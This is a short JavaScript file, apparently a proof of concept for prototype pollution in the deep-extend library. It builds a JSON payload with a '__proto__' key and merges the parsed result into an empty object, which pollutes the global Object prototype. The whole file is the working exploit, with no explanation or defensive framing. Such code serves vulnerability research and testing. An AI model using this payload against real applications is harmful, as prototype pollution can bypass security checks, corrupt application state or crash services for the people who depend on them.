 
  const merge = require("deep-extend");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  obj = {};

   

  merge({}, JSON.parse(malicious_payload));
// End of file
